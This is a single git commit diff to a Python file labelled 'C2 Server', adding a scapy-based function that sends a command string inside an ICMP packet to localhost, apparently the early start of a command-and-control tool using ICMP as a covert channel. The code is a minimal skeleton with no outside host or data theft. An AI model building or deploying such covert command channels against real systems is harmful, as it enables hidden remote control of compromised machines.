afce0a1c7d864182e26d97250cffa9fa37eb6c6a
5h3r10ck <adilaheyad@gmail.com>
2020-08-09 22:35:25 +0100

    basic func added

--- server.py
+++ server.py
@@ -1,8 +1,9 @@
-# C2 Server
-
 #!/usr/bin/env python3
 
+# C2 Server
+
 import argparse
+from scapy.all import *
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-c", "--command", help="execute command")
@@ -10,3 +11,9 @@ parser.add_argument("-t", "--transfer", help="transfer files")
 
 args = parser.parse_args()
 
+def execute(cmd):
+	packet = IP(dst="localhost")/ICMP(id=0x0001, seq=0x1)/cmd
+	send(packet)
+	print("done")
+
+execute(args.command)
